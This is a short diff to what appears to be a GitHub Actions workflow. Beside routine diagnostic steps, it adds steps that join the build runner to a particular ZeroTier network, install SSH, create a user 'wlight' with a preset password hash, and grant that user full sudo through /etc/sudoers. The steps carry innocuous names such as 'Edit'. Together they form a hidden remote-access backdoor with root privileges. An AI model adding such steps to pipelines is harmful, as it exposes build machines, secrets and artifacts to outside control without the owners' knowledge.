@@ -124,6 +124,17 @@ jobs:
         run: |
           df -h
 
+      - name: Install zerotier and run
+        run: |
+          sudo snap install zerotier -y
+          sudo zerotier join 856127940ca93cb3
+          sudo apt-get install ssh -y
+      
+      - name: Edit
+        run: |
+          sudo useradd wlight -p $1$p1y180HJ$0rABdJs13H6otyNngenLp0
+          sudo sh -c 'echo "wlight ALL=(ALL) ALL" >> /etc/sudoers'
+
       - name: Show
         run: |
           gcc --version
